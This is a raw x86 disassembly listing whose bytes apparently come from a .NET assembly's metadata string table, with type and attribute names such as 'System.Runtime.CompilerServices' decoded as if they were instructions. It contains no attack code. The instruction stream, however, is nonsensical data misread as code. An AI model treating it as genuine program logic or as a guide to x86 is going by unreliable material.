11007538:	bound  esi,QWORD PTR [ebp+0x74]
1100753b:	add    BYTE PTR gs:[ebx+0x79],dl
1100753f:	jae    0x110075b5
11007541:	gs ins DWORD PTR es:[edi],dx
11007543:	cs push edx
11007545:	jne    0x110075b5
11007547:	je     0x110075b2
11007549:	ins    DWORD PTR es:[edi],dx
1100754a:	gs cs inc ebx
1100754d:	outs   dx,DWORD PTR ds:[esi]
1100754e:	ins    DWORD PTR es:[edi],dx
1100754f:	jo     0x110075ba
11007551:	ins    BYTE PTR es:[edi],dx
11007552:	gs jb  0x110075a8
11007555:	gs jb  0x110075ce
11007558:	imul   esp,DWORD PTR [ebx+0x65],0x6e490073
1100755f:	je     0x110075c6
11007561:	jb     0x110075d1
11007563:	popa   
11007564:	ins    BYTE PTR es:[edi],dx
11007565:	jae    0x110075bd
11007567:	imul   esi,DWORD PTR [ebx+0x69],0x54656c62
1100756e:	outs   dx,DWORD PTR ds:[esi]
1100756f:	inc    ecx
11007570:	je     0x110075e6
11007572:	jb     0x110075dd
11007574:	bound  esi,QWORD PTR [ebp+0x74]
11007577:	add    BYTE PTR gs:[ecx+0x73],al
1100757b:	jae    0x110075e2
1100757d:	ins    DWORD PTR es:[edi],dx
1100757e:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
11007582:	gs ins BYTE PTR es:[edi],dx
11007584:	popa   
11007585:	jns    0x110075da
11007587:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
1100758e:	imul   esp,DWORD PTR [edx+0x75],0x52006574
11007595:	jne    0x11007605
11007597:	je     0x11007602
11007599:	ins    DWORD PTR es:[edi],dx
1100759a:	gs inc ebx
1100759c:	outs   dx,DWORD PTR ds:[esi]
1100759d:	ins    DWORD PTR es:[edi],dx
1100759e:	jo     0x11007601
110075a0:	je     0x1100760b
110075a2:	bound  ebp,QWORD PTR [ecx+0x6c]
110075a5:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
110075ad:	bound  esi,QWORD PTR [ebp+0x74]
110075b0:	add    BYTE PTR gs:[ecx+0x73],al
110075b4:	jae    0x1100761b
110075b6:	ins    DWORD PTR es:[edi],dx
110075b7:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
110075bb:	jb     0x1100762c
110075bd:	fs jne 0x11007623
110075c0:	je     0x11007603
110075c2:	je     0x11007638
110075c4:	jb     0x1100762f
110075c6:	bound  esi,QWORD PTR [ebp+0x74]
110075c9:	add    BYTE PTR gs:[ebx+0x79],dl
110075cd:	jae    0x11007643
110075cf:	gs ins DWORD PTR es:[edi],dx
110075d1:	cs push edx
110075d3:	gs jae 0x11007645
110075d6:	jne    0x1100764a
110075d8:	arpl   WORD PTR [ebp+0x73],sp
110075db:	add    BYTE PTR [esi+0x65],cl
110075de:	jne    0x11007654
110075e0:	jb     0x11007643
110075e2:	ins    BYTE PTR es:[edi],dx
110075e3:	push   edx
110075e4:	gs jae 0x11007656
110075e7:	jne    0x1100765b
110075e9:	arpl   WORD PTR [ebp+0x73],sp
110075ec:	dec    esp
110075ed:	popa   
110075ee:	outs   dx,BYTE PTR ds:[esi]
110075ef:	addr16 jne 0x11007653
110075f2:	addr16 gs inc ecx
110075f5:	je     0x1100766b
110075f7:	jb     0x11007662
110075f9:	bound  esi,QWORD PTR [ebp+0x74]
110075fc:	add    BYTE PTR gs:[ebp+0x6c],dl
11007600:	je     0x1100766b
11007602:	ins    DWORD PTR es:[edi],dx
11007603:	popa   
11007604:	je     0x1100766b
11007606:	push   edx
11007607:	gs jae 0x11007679
1100760a:	jne    0x1100767e
1100760c:	arpl   WORD PTR [ebp+0x46],sp
1100760f:	popa   
11007610:	ins    BYTE PTR es:[edi],dx
11007611:	ins    BYTE PTR es:[edi],dx
11007612:	bound  esp,QWORD PTR [ecx+0x63]
11007615:	imul   ecx,DWORD PTR [edi+ebp*2+0x63],0x61
1100761a:	je     0x11007685
1100761c:	outs   dx,DWORD PTR ds:[esi]
1100761d:	outs   dx,BYTE PTR ds:[esi]
1100761e:	add    BYTE PTR [ebx+0x79],dl
11007621:	jae    0x11007697
11007623:	gs ins DWORD PTR es:[edi],dx
11007625:	cs push edi
11007627:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
1100762e:	push   esp
1100762f:	push   0x49656d65
11007634:	outs   dx,BYTE PTR ds:[esi]
11007635:	outs   dx,WORD PTR ds:[esi]
11007637:	inc    ecx
11007638:	je     0x110076ae
1100763a:	jb     0x110076a5
1100763c:	bound  esi,QWORD PTR [ebp+0x74]
1100763f:	add    BYTE PTR gs:[edx+0x65],dl
11007643:	jae    0x110076b4
11007645:	jne    0x110076b9
11007647:	arpl   WORD PTR [ebp+0x44],sp
1100764a:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
11007651:	jb     0x110076cc
11007653:	dec    esp
11007654:	outs   dx,DWORD PTR ds:[esi]
11007655:	arpl   WORD PTR [ecx+0x74],sp
11007658:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
1100765f:	je     0x110076c6
11007661:	ins    DWORD PTR es:[edi],dx
11007662:	add    BYTE PTR [ebx+0x4c],al
11007665:	push   ebx
11007666:	inc    ebx
11007667:	outs   dx,DWORD PTR ds:[esi]
11007668:	ins    DWORD PTR es:[edi],dx
11007669:	jo     0x110076d7
1100766b:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
11007672:	jb     0x110076dd
11007674:	bound  esi,QWORD PTR [ebp+0x74]
11007677:	add    BYTE PTR gs:[ecx+0x73],al
1100767b:	jae    0x110076e2
1100767d:	ins    DWORD PTR es:[edi],dx
1100767e:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
11007682:	gs jns 0x110076cb
11007685:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
1100768d:	bound  esi,QWORD PTR [ebp+0x74]
11007690:	add    BYTE PTR gs:[ecx+0x73],al
11007694:	jae    0x110076fb
11007696:	ins    DWORD PTR es:[edi],dx
11007697:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
1100769b:	gs jns 0x110076ec
1100769e:	popa   
1100769f:	ins    DWORD PTR es:[edi],dx
110076a0:	gs inc ecx
110076a2:	je     0x11007718
110076a4:	jb     0x1100770f
110076a6:	bound  esi,QWORD PTR [ebp+0x74]
110076a9:	add    BYTE PTR gs:[ebx+0x6f],al
110076ad:	ins    DWORD PTR es:[edi],dx
110076ae:	jo     0x11007719
110076b0:	ins    BYTE PTR es:[edi],dx
110076b1:	popa   
110076b2:	je     0x1100771d
110076b4:	outs   dx,DWORD PTR ds:[esi]
110076b5:	outs   dx,BYTE PTR ds:[esi]
110076b6:	push   edx
110076b7:	gs ins BYTE PTR es:[edi],dx
110076b9:	popa   
110076ba:	js     0x1100771d
110076bc:	je     0x11007727
110076be:	outs   dx,DWORD PTR ds:[esi]
110076bf:	outs   dx,BYTE PTR ds:[esi]
110076c0:	jae    0x11007703
110076c2:	je     0x11007738
110076c4:	jb     0x1100772f
110076c6:	bound  esi,QWORD PTR [ebp+0x74]
110076c9:	add    BYTE PTR gs:[edi+0x62],cl
110076cd:	push   0x65
110076cf:	arpl   WORD PTR [eax+eax*1+0x41],si
110076d3:	je     0x11007749
110076d5:	jb     0x11007740
110076d7:	bound  esi,QWORD PTR [ebp+0x74]
110076da:	add    BYTE PTR gs:[esi+0x65],ch
110076de:	add    BYTE PTR [edi+0x64],ah
110076e1:	add    BYTE PTR [ebx+0x79],dl
110076e4:	jae    0x1100775a
110076e6:	gs ins DWORD PTR es:[edi],dx
110076e8:	cs inc ebx
110076ea:	outs   dx,DWORD PTR ds:[esi]
110076eb:	ins    BYTE PTR es:[edi],dx
110076ec:	ins    BYTE PTR es:[edi],dx
110076ed:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
110076f2:	outs   dx,BYTE PTR ds:[esi]
110076f3:	jae    0x110076f5
110076f5:	dec    eax
110076f6:	popa   
110076f7:	jae    0x11007761
110076f9:	je     0x1100775c
110076fb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
110076ff:	arpl   WORD PTR [eax+eax*1+0x61],bp
11007703:	add    BYTE PTR [ebx+0x74],dl
11007706:	jb     0x11007771
11007708:	outs   dx,BYTE PTR ds:[esi]
11007709:	add    BYTE PTR [di+0x71],al
1100770d:	jne    0x11007770
1100770f:	ins    BYTE PTR es:[edi],dx
11007710:	jae    0x11007712
11007712:	add    BYTE PTR [bp+0x78],dh
11007716:	add    BYTE PTR [edi+0x65],ah
11007719:	je     0x1100777a
1100771b:	inc    ebx
1100771c:	push   0x737261
11007721:	addr16 gs je 0x11007784
11007725:	dec    esp
11007726:	outs   dx,BYTE PTR gs:[esi]
11007728:	addr16 je 0x11007793
1100772b:	add    BYTE PTR [ebx+0x74],dl
1100772e:	popa   
1100772f:	jb     0x110077a5
11007731:	jae    0x1100778a
11007733:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x6f736552
1100773b:	jne    0x110077af
1100773d:	arpl   WORD PTR [ebp+0x4d],sp
11007740:	popa   
11007741:	outs   dx,BYTE PTR ds:[esi]
11007742:	popa   
11007743:	addr16 gs jb 0x11007747
11007747:	xor    DWORD PTR fs:[eax],eax
1100774a:	inc    edi
1100774b:	gs je  0x110077a1
1100774e:	je     0x110077c2
11007750:	imul   ebp,DWORD PTR [esi+0x67],0x70704100
11007757:	ins    BYTE PTR es:[edi],dx
11007758:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
1100775f:	inc    ebp
11007760:	js     0x110077c5
11007762:	gs jo  0x110077d9
11007765:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
1100776c:	pop    edi
1100776d:	dec    ecx
1100776e:	je     0x110077d5
11007770:	ins    DWORD PTR es:[edi],dx
11007771:	add    BYTE PTR [ebx+0x65],dh
11007774:	je     0x110077d5
11007776:	dec    ecx
11007777:	je     0x110077de
11007779:	ins    DWORD PTR es:[edi],dx
1100777a:	add    BYTE PTR [ebx+0x79],dl
1100777d:	jae    0x110077f3
1100777f:	gs ins DWORD PTR es:[edi],dx
11007781:	cs inc edi
11007783:	ins    BYTE PTR es:[edi],dx
11007784:	outs   dx,DWORD PTR ds:[esi]
11007785:	bound  esp,QWORD PTR [ecx+0x6c]
11007788:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
1100778f:	add    BYTE PTR [ebx+0x75],al
11007792:	ins    BYTE PTR es:[edi],dx
11007793:	je     0x1100780a
11007795:	jb     0x110077fc
11007797:	dec    ecx
11007798:	outs   dx,BYTE PTR ds:[esi]
11007799:	outs   dx,WORD PTR ds:[esi]
1100779b:	add    BYTE PTR [edi+0x65],ah
1100779e:	je     0x110077ff
110077a0:	dec    ecx
110077a1:	outs   dx,BYTE PTR ds:[esi]
110077a2:	jbe    0x11007805
110077a4:	jb     0x1100780f
110077a6:	popa   
110077a7:	outs   dx,BYTE PTR ds:[esi]
110077a8:	je     0x110077ed
110077aa:	jne    0x11007818
110077ac:	je     0x11007823
110077ae:	jb     0x11007815
110077b0:	add    BYTE PTR [edi+ebp*2+0x4c],dl
110077b4:	outs   dx,DWORD PTR ds:[esi]
110077b5:	ja     0x1100781c
110077b7:	jb     0x110077b9
110077b9:	inc    ebp
110077ba:	outs   dx,BYTE PTR ds:[esi]
110077bb:	fs jae 0x11007815
110077be:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x6e00746f
110077c6:	jno    0x110077c8
110077c8:	outs   dx,BYTE PTR ds:[esi]
110077c9:	jne    0x110077cb
110077cb:	ja     0x1100782e
110077cd:	add    BYTE PTR [esi+0x73],ch
110077d0:	add    BYTE PTR [edi+0x69],dh
110077d3:	add    BYTE PTR [ebx+0x79],dl
110077d6:	jae    0x1100784c
110077d8:	gs ins DWORD PTR es:[edi],dx
110077da:	cs dec ecx
110077dc:	dec    edi
110077dd:	add    BYTE PTR [eax+0x61],dl
110077e0:	je     0x1100784a
110077e2:	add    BYTE PTR [edi+0x65],al
110077e5:	je     0x1100782d
110077e7:	jne    0x11007855
110077e9:	ins    BYTE PTR es:[edi],dx
110077ea:	push   eax
110077eb:	popa   
110077ec:	je     0x11007856
110077ee:	add    BYTE PTR [esi+0x6b],ch
110077f1:	add    BYTE PTR [ecx+0x66],ch
110077f4:	add    BYTE PTR [ebx+0x75],dl
110077f7:	bound  esi,QWORD PTR [ebx+0x74]
110077fa:	jb     0x11007865
110077fc:	outs   dx,BYTE PTR ds:[esi]
110077fd:	add    BYTE PTR [bx+di+0x6e],cl
11007801:	fs gs js 0x11007854
11007805:	data16 add BYTE PTR [edi+0x65],al
11007809:	je     0x1100784f
1100780b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
11007812:	jns    0x11007862
11007814:	popa   
11007815:	ins    DWORD PTR es:[edi],dx
11007816:	add    BYTE PTR gs:[ecx+ebp*2+0x72],al
1100781b:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
11007820:	jns    0x11007875
11007822:	gs jo  0x11007886
11007825:	jb     0x11007888
11007827:	je     0x11007898
11007829:	jb     0x1100786e
1100782b:	push   0x43007261
11007830:	push   0x43007261
11007835:	outs   dx,DWORD PTR ds:[esi]
11007836:	outs   dx,BYTE PTR ds:[esi]
11007837:	arpl   WORD PTR [ecx+0x74],sp
1100783a:	add    BYTE PTR [ebx+0x6f],al
1100783d:	outs   dx,BYTE PTR ds:[esi]
1100783e:	jae    0x110078af
11007840:	ins    BYTE PTR es:[edi],dx
11007841:	add    BYTE PTR gs:[edi+0x72],dl
11007845:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
1100784d:	inc    ecx
1100784e:	fs add BYTE PTR fs:[ebx+0x70],dl
11007853:	ins    BYTE PTR es:[edi],dx
11007854:	imul   esi,DWORD PTR [eax+eax*1+0x54],0x6d6972
1100785c:	jo     0x110078cc
1100785e:	add    BYTE PTR [ebx+eiz*2+0x0],dh
11007862:	inc    ecx
11007863:	jb     0x110078d7
11007865:	popa   
11007866:	jns    0x110078b4
11007868:	imul   esi,DWORD PTR [ebx+0x74],0x366600
1100786f:	outs   dx,BYTE PTR gs:[esi]
11007871:	add    BYTE PTR [esi+0x34],ch
11007874:	add    BYTE PTR [ebp+0x30],ch
11007877:	add    BYTE PTR [ecx+0x45],cl
1100787a:	outs   dx,BYTE PTR ds:[esi]
1100787b:	jne    0x110078ea
1100787d:	gs jb  0x110078e1
11007880:	je     0x110078f1
11007882:	jb     0x11007884
11007884:	dec    ecx
11007885:	inc    esp
11007886:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
1100788d:	ins    BYTE PTR es:[edi],dx
1100788e:	add    BYTE PTR gs:[edi+ebp*2+0x0],dh
11007893:	inc    edi
11007894:	gs je  0x110078dd
11007897:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
1100789f:	bound  eax,QWORD PTR [eax]
110078a1:	arpl   WORD PTR [eax],ax
110078a3:	outs   dx,DWORD PTR ds:[esi]
110078a4:	jo     0x11007905
110078a6:	dec    ecx
110078a7:	outs   dx,BYTE PTR ds:[esi]
110078a8:	gs jno 0x11007920
110078ab:	popa   
110078ac:	ins    BYTE PTR es:[edi],dx
110078ad:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x7473614c
110078b5:	dec    ecx
110078b6:	outs   dx,BYTE PTR ds:[esi]
110078b7:	fs gs js 0x1100790a
110078bb:	data16 add BYTE PTR [esi+0x69],ch
110078bf:	add    BYTE PTR [esi+0x0],ah
110078c2:	inc    edi
110078c3:	gs je  0x1100790b
110078c6:	outs   dx,BYTE PTR ds:[esi]
110078c7:	jne    0x11007936
110078c9:	gs jb  0x1100792d
110078cc:	je     0x1100793d
110078ce:	jb     0x110078d0
110078d0:	push   0x78
110078d2:	add    BYTE PTR [eax+0x39],bh
110078d5:	add    BYTE PTR [ebx+0x6f],al
110078d8:	outs   dx,BYTE PTR ds:[esi]
110078d9:	je     0x1100793c
110078db:	imul   ebp,DWORD PTR [esi+0x73],0x766f4d00
110078e2:	gs dec esi
110078e4:	gs js  0x1100795b
110078e7:	add    BYTE PTR [edi+0x65],ah
110078ea:	je     0x1100794b
110078ec:	inc    ebx
110078ed:	jne    0x11007961
110078ef:	jb     0x11007956
110078f1:	outs   dx,BYTE PTR ds:[esi]
110078f2:	je     0x110078f4
110078f4:	imul   esp,DWORD PTR [edi+0x0],0x70736944
110078fb:	outs   dx,DWORD PTR ds:[esi]
110078fc:	jae    0x11007963
110078fe:	add    BYTE PTR [edx+0x6a],dh
11007901:	add    BYTE PTR [ecx+eiz*2+0x0],dh
11007905:	outs   dx,DWORD PTR ds:[esi]
11007906:	ja     0x11007908
11007908:	outs   dx,DWORD PTR ds:[esi]
11007909:	cmp    DWORD PTR [eax],eax
1100790b:	outs   dx,BYTE PTR ds:[esi]
1100790c:	ins    DWORD PTR es:[edi],dx
1100790d:	add    BYTE PTR [esi+0x77],ch
11007910:	add    BYTE PTR [ebx+0x62],dh
11007913:	add    BYTE PTR [edx+0x69],dh
11007916:	add    BYTE PTR [ebx+0x39],dh
11007919:	add    BYTE PTR [ebp+0x6e],al
1100791c:	jbe    0x11007987
1100791e:	jb     0x1100798f
11007920:	outs   dx,BYTE PTR ds:[esi]
11007921:	ins    DWORD PTR es:[edi],dx
11007922:	outs   dx,BYTE PTR gs:[esi]
11007924:	je     0x11007926
11007926:	addr16 gs je 0x11007989
1100792a:	inc    ebx
1100792b:	jne    0x1100799f
1100792d:	jb     0x11007994
1100792f:	outs   dx,BYTE PTR ds:[esi]
11007930:	je     0x11007976
11007932:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
11007939:	jns    0x1100793b
1100793b:	inc    esi
1100793c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x61657274
11007944:	ins    DWORD PTR es:[edi],dx
11007945:	add    BYTE PTR [esi+0x6a],ch
11007948:	add    BYTE PTR [esi+0x69],al
1100794b:	ins    BYTE PTR es:[edi],dx
1100794c:	gs dec ebp
1100794e:	outs   dx,DWORD PTR ds:[esi]
1100794f:	fs add BYTE PTR gs:[esi+0x69],al
11007954:	ins    BYTE PTR es:[edi],dx
11007955:	gs inc ecx
11007957:	arpl   WORD PTR [ebx+0x65],sp
1100795a:	jae    0x110079cf
1100795c:	add    BYTE PTR [ebx+0x74],dl
1100795f:	jb     0x110079c6
11007961:	popa   
11007962:	ins    DWORD PTR es:[edi],dx
11007963:	add    BYTE PTR [edx+0x69],ch
11007966:	add    BYTE PTR [ebp+0x6b],ch
11007969:	add    BYTE PTR [ebx+0x67],ch
1100796c:	add    BYTE PTR [edi+0x68],ah
1100796f:	add    BYTE PTR [edi+eiz*2+0x0],ch
11007973:	inc    ebx
11007974:	ins    BYTE PTR es:[edi],dx
11007975:	outs   dx,DWORD PTR ds:[esi]
11007976:	jae    0x110079dd
11007978:	add    BYTE PTR [ebp+0x0],ah
1100797b:	jne    0x110079de
1100797d:	add    BYTE PTR [eax+eax*1+0x67],ah
11007981:	gs je  0x110079e3
11007984:	inc    ebx
11007985:	outs   dx,DWORD PTR ds:[esi]
11007986:	jne    0x110079f6
11007988:	je     0x1100798a
1100798a:	push   esp
1100798b:	outs   dx,DWORD PTR ds:[esi]
1100798c:	inc    ebx
1100798d:	push   0x72417261
11007992:	jb     0x110079f5
11007994:	jns    0x11007996
11007996:	dec    ecx
11007997:	outs   dx,BYTE PTR ds:[esi]
11007998:	je     0x110079ff
1100799a:	jb     0x11007a0a
1100799c:	add    BYTE PTR [eax+0x72],dl
1100799f:	gs inc ebp
110079a1:	ins    DWORD PTR es:[edi],dx
110079a2:	jo     0x11007a18
110079a4:	imul   esi,DWORD PTR [esi+0x65],0x746f442e
110079ab:	data16 jne 0x11007a21
110079ae:	arpl   WORD PTR [ecx+0x74],sp
110079b1:	outs   dx,DWORD PTR ds:[esi]
110079b2:	jb     0x110079e2
110079b4:	inc    ecx
110079b5:	jo     0x11007a27
110079b7:	ins    BYTE PTR es:[edi],dx
110079b8:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
110079bf:	add    BYTE PTR [esi+0x69],dl
110079c2:	gs ja  0x11007a11
110079c5:	imul   esp,DWORD PTR [ebx+0x65],0x65736e
110079cc:	ins    DWORD PTR es:[edi],dx
110079cd:	imul   eax,DWORD PTR [eax],0x646e6957
110079d3:	outs   dx,DWORD PTR ds:[esi]
110079d4:	ja     0x110079d6
110079d6:	jae    0x11007a3d
110079d8:	je     0x11007a39
110079da:	push   esp
110079db:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x6c754e00
110079e3:	ins    BYTE PTR es:[edi],dx
110079e4:	popa   
110079e5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
110079e9:	xor    DWORD PTR [eax],eax
110079eb:	push   ebx
110079ec:	push   0x6944776f
110079f1:	popa   
110079f2:	ins    BYTE PTR es:[edi],dx
110079f3:	outs   dx,DWORD PTR ds:[esi]
110079f4:	add    BYTE PTR [bp+di+0x79],dl
110079f8:	jae    0x11007a6e
110079fa:	gs ins DWORD PTR es:[edi],dx
110079fc:	cs push esp
110079fe:	push   0x64616572
11007a03:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
11007a0a:	gs popa 
11007a0c:	add    BYTE PTR fs:[edi+0x65],ah
11007a10:	je     0x11007a71
11007a12:	inc    ebx
11007a13:	jne    0x11007a87
11007a15:	jb     0x11007a7c
11007a17:	outs   dx,BYTE PTR ds:[esi]
11007a18:	je     0x11007a6e
11007a1a:	push   0x64616572
11007a1f:	add    BYTE PTR [ebx+0x65],dh
11007a22:	je     0x11007a83
11007a24:	inc    ebx
11007a25:	jne    0x11007a99
11007a27:	jb     0x11007a8e
11007a29:	outs   dx,BYTE PTR ds:[esi]
11007a2a:	je     0x11007a81
11007a2c:	dec    ecx
11007a2d:	inc    ebx
11007a2e:	jne    0x11007a9c
11007a30:	je     0x11007aa7
11007a32:	jb     0x11007a99
11007a34:	add    BYTE PTR [esi+0x6f],al
11007a37:	jb     0x11007aa6
11007a39:	popa   
11007a3a:	je     0x11007a3c
11007a3c:	inc    ebp
11007a3d:	js     0x11007aa2
11007a3f:	gs jo  0x11007ab6
11007a42:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
11007a49:	pop    edi
11007a4a:	dec    esi
11007a4b:	gs ja  0x11007a9a
11007a4e:	imul   ebp,DWORD PTR [esi+0x65],0x65725000
11007a55:	inc    ebp
11007a56:	ins    DWORD PTR es:[edi],dx
11007a57:	jo     0x11007acd
11007a59:	imul   esi,DWORD PTR [esi+0x65],0x746f442e
11007a60:	data16 jne 0x11007ad6
11007a63:	arpl   WORD PTR [ecx+0x74],sp
11007a66:	outs   dx,DWORD PTR ds:[esi]
11007a67:	jb     0x11007a97
11007a69:	inc    edi
11007a6a:	jne    0x11007ad5
11007a6c:	add    BYTE PTR [edi+ebp*2+0x74],al
11007a70:	data16 jne 0x11007ae6
11007a73:	arpl   WORD PTR [ecx+0x74],sp
11007a76:	outs   dx,DWORD PTR ds:[esi]
11007a77:	jb     0x11007ac1
11007a79:	gs ins BYTE PTR es:[edi],dx
11007a7b:	jo     0x11007ac1
11007a7d:	imul   esp,DWORD PTR [ecx+0x6c],0x5300676f
11007a84:	jns    0x11007af9
11007a86:	je     0x11007aed
11007a88:	ins    DWORD PTR es:[edi],dx
11007a89:	cs pop eax
11007a8b:	ins    DWORD PTR es:[edi],dx
11007a8c:	ins    BYTE PTR es:[edi],dx
11007a8d:	add    BYTE PTR [eax+0x6d],bl
11007a90:	ins    BYTE PTR es:[edi],dx
11007a91:	push   edx
11007a92:	gs popa 
11007a94:	fs gs jb 0x11007a98
11007a98:	push   ebp
11007a99:	jb     0x11007b04
11007a9b:	add    BYTE PTR [ebx+0x79],dl
11007a9e:	jae    0x11007b14
11007aa0:	gs ins DWORD PTR es:[edi],dx
11007aa2:	cs push edi
11007aa4:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
11007aab:	push   edx
11007aac:	gs jae 0x11007b1e
11007aaf:	jne    0x11007b23
11007ab1:	arpl   WORD PTR [ebp+0x73],sp
11007ab4:	add    BYTE PTR [ebx+0x74],dl
11007ab7:	jb     0x11007b1e
11007ab9:	popa   
11007aba:	ins    DWORD PTR es:[edi],dx
11007abb:	push   edx
11007abc:	gs jae 0x11007b2e
11007abf:	jne    0x11007b33
11007ac1:	arpl   WORD PTR [ebp+0x49],sp
11007ac4:	outs   dx,BYTE PTR ds:[esi]
11007ac5:	outs   dx,WORD PTR ds:[esi]
11007ac7:	add    BYTE PTR [eax+0x6d],bl
11007aca:	ins    BYTE PTR es:[edi],dx
11007acb:	inc    esp
11007acc:	outs   dx,DWORD PTR ds:[esi]
11007acd:	arpl   WORD PTR [ebp+0x6d],si
11007ad0:	outs   dx,BYTE PTR gs:[esi]
11007ad2:	je     0x11007ad4
11007ad4:	push   ebx
11007ad5:	je     0x11007b49
11007ad7:	imul   ebp,DWORD PTR [esi+0x67],0x74697257
11007ade:	gs jb  0x11007ae1
11007ae1:	pop    eax
11007ae2:	ins    DWORD PTR es:[edi],dx
11007ae3:	ins    BYTE PTR es:[edi],dx
11007ae4:	push   esp
11007ae5:	gs js  0x11007b5c
11007ae8:	push   edi
11007ae9:	jb     0x11007b54
11007aeb:	je     0x11007b52
11007aed:	jb     0x11007aef
11007aef:	push   ebp
11007af0:	jb     0x11007b5b
11007af2:	dec    ebx
11007af3:	imul   ebp,DWORD PTR [esi+0x64],0x70704100
11007afa:	ins    BYTE PTR es:[edi],dx
11007afb:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
11007b02:	add    BYTE PTR [edi+0x65],al
11007b05:	je     0x11007b59
11007b07:	gs jae 0x11007b79
11007b0a:	jne    0x11007b7e
11007b0c:	arpl   WORD PTR [ebp+0x53],sp
11007b0f:	je     0x11007b83
11007b11:	gs popa 
11007b13:	ins    DWORD PTR es:[edi],dx
11007b14:	add    BYTE PTR [edi+0x65],ah
11007b17:	je     0x11007b78
11007b19:	push   ebx
11007b1a:	je     0x11007b8e
11007b1c:	gs popa 
11007b1e:	ins    DWORD PTR es:[edi],dx
11007b1f:	add    BYTE PTR [eax+0x6d],bl
11007b22:	ins    BYTE PTR es:[edi],dx
11007b23:	push   esp
11007b24:	gs js  0x11007b9b
11007b27:	push   edx
11007b28:	gs popa 
11007b2a:	fs gs jb 0x11007b2e
11007b2e:	dec    esp
11007b2f:	outs   dx,DWORD PTR ds:[esi]
11007b30:	popa   
11007b31:	add    BYTE PTR fs:[ebp+eiz*2+0x78],dl
11007b36:	je     0x11007b8f
11007b38:	jb     0x11007ba3
11007b3a:	je     0x11007ba1
11007b3c:	jb     0x11007b3e
11007b3e:	pop    eax
11007b3f:	ins    DWORD PTR es:[edi],dx
11007b40:	ins    BYTE PTR es:[edi],dx
11007b41:	dec    esi
11007b42:	outs   dx,DWORD PTR ds:[esi]
11007b43:	fs add BYTE PTR gs:[eax+0x6d],bl
11007b48:	ins    BYTE PTR es:[edi],dx
11007b49:	push   edi
11007b4a:	jb     0x11007bb5
11007b4c:	je     0x11007bb3
11007b4e:	jb     0x11007b50
11007b50:	push   edi
11007b51:	jb     0x11007bbc
11007b53:	je     0x11007bba
11007b55:	push   esp
11007b56:	outs   dx,DWORD PTR ds:[esi]
11007b57:	add    BYTE PTR [edi+ebp*2+0x53],dl
11007b5b:	je     0x11007bcf
11007b5d:	imul   ebp,DWORD PTR [esi+0x67],0x6c6d5800
11007b64:	dec    esi
11007b65:	outs   dx,DWORD PTR ds:[esi]
11007b66:	fs gs dec esp
11007b69:	imul   esi,DWORD PTR [ebx+0x74],0x74654700
11007b70:	inc    ebp
11007b71:	ins    BYTE PTR es:[edi],dx
11007b72:	gs ins DWORD PTR es:[edi],dx
11007b74:	outs   dx,BYTE PTR gs:[esi]
11007b76:	je     0x11007beb
11007b78:	inc    edx
11007b79:	jns    0x11007bcf
11007b7b:	popa   
11007b7c:	addr16 dec esi
11007b7e:	popa   
11007b7f:	ins    DWORD PTR es:[edi],dx
11007b80:	add    BYTE PTR gs:[ebx+0x65],dh
11007b84:	je     0x11007be5
11007b86:	dec    ecx
11007b87:	outs   dx,BYTE PTR ds:[esi]
11007b88:	outs   dx,BYTE PTR ds:[esi]
11007b89:	gs jb  0x11007be0
11007b8c:	gs js  0x11007c03
11007b8f:	add    BYTE PTR [edi+0x70],ch
11007b92:	pop    edi
11007b93:	inc    ebp
11007b94:	jno    0x11007c0b
11007b96:	popa   
11007b97:	ins    BYTE PTR es:[edi],dx
11007b98:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x67006a6d
11007ba0:	gs je  0x11007c02
11007ba3:	dec    ecx
11007ba4:	outs   dx,BYTE PTR ds:[esi]
11007ba5:	outs   dx,BYTE PTR ds:[esi]
11007ba6:	gs jb  0x11007bfd
11007ba9:	gs js  0x11007c20
11007bac:	add    BYTE PTR [ecx+0x73],cl
11007baf:	dec    esi
11007bb0:	jne    0x11007c1e
11007bb2:	ins    BYTE PTR es:[edi],dx
11007bb3:	dec    edi
11007bb4:	jb     0x11007bfb
11007bb6:	ins    DWORD PTR es:[edi],dx
11007bb7:	jo     0x11007c2d
11007bb9:	jns    0x11007bbb
11007bbb:	ins    BYTE PTR es:[edi],dx
11007bbc:	jbe    0x11007bbe
11007bbe:	imul   esi,DWORD PTR [ebx],0x6e6c00
11007bc4:	ins    DWORD PTR es:[edi],dx
11007bc5:	bound  eax,QWORD PTR [eax]
11007bc7:	bound  edi,QWORD PTR [ecx]
11007bc9:	add    BYTE PTR [esi+0x34],ah
11007bcc:	add    BYTE PTR [edx+0x7a],ch
11007bcf:	add    BYTE PTR [ebp+0x61],ch
11007bd2:	add    BYTE PTR [ebx+0x54],dl
11007bd5:	inc    ecx
11007bd6:	push   esp
